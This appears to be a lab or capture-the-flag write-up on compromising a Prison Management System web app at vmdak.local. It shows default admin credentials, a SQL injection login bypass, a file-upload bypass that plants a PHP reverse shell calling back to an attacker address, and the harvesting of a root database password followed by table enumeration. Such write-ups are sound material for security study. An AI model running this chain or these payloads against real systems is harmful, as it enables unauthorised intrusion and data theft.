# Prison Management System

Prison Management System exposed over HTTPS can allow authenticated PHP file upload RCE through the administrator photo upload workflow.

## Discovery

The SSL certificate may reveal the hostname:

```text
Subject: commonName=vmdak.local/organizationName=PrisonManagement
Subject Alternative Name: DNS:vmdak.local
```

Useful enumerated directories:

```text
/css/
/image/
/images/
/inc/
/js/
/lib/
```

## Authentication

The admin login is at:

```text
https://vmdak.local:9443/Admin/login.php
```

Valid admin credentials:

```text
admin:admin123
```

SQL injection also authenticated successfully:

```text
Username: admin' or '1'='1
Password: asdf
```

## Authenticated File Upload RCE

The administrator photo upload endpoint is:

```text
https://vmdak.local:9443/Admin/edit-photo.php
```

Prepare a PHP reverse shell:

```bash
mv php-reverse-shell.php shell.php
```

Upload it as an image, intercept the upload request in Burp, and change the uploaded filename from `shell.jpg` to `shell.php` before forwarding it.

Trigger the uploaded shell:

```text
https://vmdak.local:9443/uploadImage/shell.php
```

Successful shell:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux vmdak.local 6.8.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC Fri Jul 5 10:34:03 UTC 2024 x86_64
```

## Database Credentials

From the web root, search for database connection files:

```bash
cd /var/www/prison
grep -RInE '\b(mysqli_connect|new[[:space:]]+mysqli|PDO[[:space:]]*\(|mysql_connect)\b' .
cat ./database/connect2.php
```

Useful values:

```php
$servername = "localhost";
$username = "root";
$password = "sqlCr3ds3xp0seD";
$dbname = "employee_akpoly";
```

Connect locally:

```bash
mysql -u root -h localhost -p
```

Useful database enumeration:

```sql
show databases;
use employee_akpoly;
show tables;
select * from users;
select * from tblemployee\G
select * from tblleave\G
```

## References

- https://www.exploit-db.com/exploits/52017
- https://www.rapid7.com/db/modules/exploit/linux/http/prison_management_rce/
